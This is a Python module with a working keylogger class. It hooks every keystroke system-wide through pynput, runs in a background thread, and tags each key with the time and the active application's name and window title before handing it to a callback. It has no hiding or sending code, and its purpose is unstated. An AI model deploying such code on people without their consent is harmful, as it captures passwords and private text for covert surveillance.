import threading
import datetime
from pynput import keyboard

try:
    import win32gui
    import win32process
    import psutil
    _WIN = True
except ImportError:
    _WIN = False


def _active_app():
    if not _WIN:
        return "Unknown"
    try:
        hwnd = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(hwnd) or ""
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        try:
            name = psutil.Process(pid).name().replace(".exe", "")
        except Exception:
            name = "?"
        return f"{name} — {title}" if title else name
    except Exception:
        return "Unknown"


class Keylogger:
    def __init__(self, on_key):
        self._on_key = on_key

    def start(self):
        t = threading.Thread(target=self._run, daemon=True, name="keylogger")
        t.start()

    def _run(self):
        _MODS = {
            keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r,
            keyboard.Key.ctrl,  keyboard.Key.ctrl_l,  keyboard.Key.ctrl_r,
            keyboard.Key.alt,   keyboard.Key.alt_l,   keyboard.Key.alt_r,
            keyboard.Key.cmd,   keyboard.Key.caps_lock,
        }
        held = set()

        def _press(key):
            if key in _MODS:
                held.add(key)
                return
            now = datetime.datetime.now().strftime("%H:%M:%S")
            app = _active_app()
            try:
                char = key.char  # pynput resolves shift+2 → '@' via OS layout
                if not char:
                    return
            except AttributeError:
                name = getattr(key, "name", str(key)).upper()
                # format special keys nicely
                pretty = {
                    "ENTER": "↵", "BACKSPACE": "⌫", "SPACE": " ",
                    "TAB": "⇥", "DELETE": "⌦", "CAPS_LOCK": "⇪",
                    "UP": "↑", "DOWN": "↓", "LEFT": "←", "RIGHT": "→",
                    "ESC": "Esc",
                }.get(name, f"[{name}]")
                char = pretty
            self._on_key({"char": char, "time": now, "app": app})

        def _release(key):
            held.discard(key)

        with keyboard.Listener(on_press=_press, on_release=_release) as listener:
            listener.join()
